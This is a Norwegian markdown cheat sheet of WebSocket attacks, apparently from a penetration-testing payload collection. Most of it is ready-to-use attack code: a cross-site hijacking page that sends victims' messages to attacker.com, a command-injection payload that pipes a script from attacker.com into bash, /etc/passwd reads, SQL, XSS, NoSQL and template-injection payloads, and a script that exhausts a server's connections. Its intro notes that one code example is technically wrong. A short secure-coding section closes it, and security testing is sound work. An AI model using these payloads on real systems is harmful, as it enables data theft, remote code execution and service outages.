# 🔌 Hurtigreferanse for WebSocket-angrep

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

> **Begreper og presisering:** CSWSH er kapring av en WebSocket-økt fra et annet nettsted og krever flere forutsetninger enn manglende Origin-kontroll alene. Autentisering og autorisasjon må vurderes per forbindelse og melding. Nettleserens `WebSocket(url, protocols)` tar subprotokoller som andre argument, ikke vilkårlige HTTP-headere; se [MDNs konstruktørdokumentasjon](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/WebSocket). Det viste objektargumentet med Origin er derfor ikke en generell måte å sette headeren på. Origin er heller ikke alene autentisering, og det forenklede servereksemplet er ikke en komplett sikker implementasjon. Koden er bevart.

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

## 🔍 Grunnleggende WebSocket

### Forespørsel for oppkoblingshåndtrykk
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Respons på oppkoblingshåndtrykk
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Deteksjon
```
- ws:// (ukryptert)
- wss:// (TLS-kryptert)
- Headeren Upgrade: websocket
- Network-fanen viser "101 Switching Protocols"
```

---

## 🎯 WebSocket-sårbarheter

### 1. Cross-Site WebSocket Hijacking (CSWSH, kapring fra et annet nettsted)

**Sårbar forutsetning:** Serveren validerer ikke Origin-headeren

```html
<!-- Attacker's page -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Forbindelsen er åpnet; angriperen kan sende meldinger
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Hent ut data og send dem til angriperen
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Angrep som ligner CSRF:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Utfør handlinger som offeret
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Manglende validering av Origin

**Testing:**
```bash
# Med wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Med websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Utnyttelse:**
```javascript
// Hvis serveren godtar enhver Origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Omgåelse av autentisering

**Ingen autentisering på WebSocket-forbindelsen:**
```javascript
// Koble til uten informasjonskapsler eller tokener
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Kreves ikke autentisering?
};
```

**Token i URL-en (fare for lekkasje):**
```
wss://target.com/ws?token=SECRET_TOKEN
// Tokenet kan lekke i logger eller referrer-headere
```

**Testing av ulike autentiseringstilstander:**
```javascript
// Test med utløpt token
// Test med endret token
// Test uten token
// Test med en annen brukers token
```

---

### 4. Injeksjonsangrep via WebSocket

**XSS via WebSocket:**
```javascript
// Send XSS-payload
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL-injeksjon:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Kommandoinjeksjon:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL-injeksjon:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. Tjenestenektangrep

**Oversvømmelse av meldinger:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Store meldinger
  }, 1);
};
```

**Uttømming av forbindelser:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Hold forbindelsen åpen

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Manipulering av data

**Endring av meldinger:**
```javascript
// Avskjær og endre meldinger
// Med avskjæring av WebSocket-meldinger i Burp Suite

// Opprinnelig
{"action": "transfer", "amount": 10, "to": "user123"}

// Endret
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Race conditions (kappløp mellom operasjoner):**
```javascript
// Send flere forespørsler raskt
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠️ Testverktøy

### Burp Suite
```
1. Proxy → WebSockets history
2. Right-click → Send to Repeater
3. Endre og send meldingene på nytt
4. Merk av for "Auto-scroll to end"
```

### wscat (kommandolinje)
```bash
# Installer
npm install -g wscat

# Koble til
wscat -c wss://target.com/ws

# Med headere
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Med Origin
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Installer
cargo install websocat

# Koble til
websocat wss://target.com/ws

# Med headere
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Python-skript for testing
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Testpayloads
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Nettleserens utviklerverktøy
```javascript
// Overvåk WebSocket-trafikk
// F12 → Network → WS filter

// Manuell testing
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Payloadsamling

### Testing av autentisering
```json
// Ingen autentisering
{"action": "get_secret_data"}

// Tomt token
{"token": "", "action": "admin_action"}

// Null-token
{"token": null, "action": "delete_user"}
```

### XSS-payloads
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### SQLi-payloads
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Kommandoinjeksjon
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Katalogtraversering
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Sjekkliste for testing

```markdown
## Sjekkliste for WebSocket-sikkerhet

□ Identifiser WebSocket-endepunkter
□ Kontroller validering av Origin-headeren
□ Test CSWSH (Cross-Site WebSocket Hijacking)
□ Test krav til autentisering
□ Kontroller om tokener overføres sikkert
□ Test injeksjonssårbarheter (XSS, SQLi osv.)
□ Test autorisasjon (tilgang til andre brukeres data)
□ Se etter hastighetsbegrensning
□ Test grenser for meldingsstørrelse
□ Se etter eksponering av sensitive data
□ Test forbindelseshåndtering (ny tilkobling)
□ Kontroller kryptering (wss:// mot ws://)
```

---

## 🔐 Sikker implementasjon

```javascript
// Validering av Origin på serversiden
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Tokenbasert autentisering
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Validering av inndata
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

## 🔗 Relaterte payloads

- [XSS-payloads](XSS.nb.md)
- [SQLi-payloads](SQLi.nb.md)
- [Kommandoinjeksjon](Command-Injection.nb.md)

---

**Tilbake til payloadsamlingen:** [💉 Payloadsamling](../../README.md#-payloads-collection)
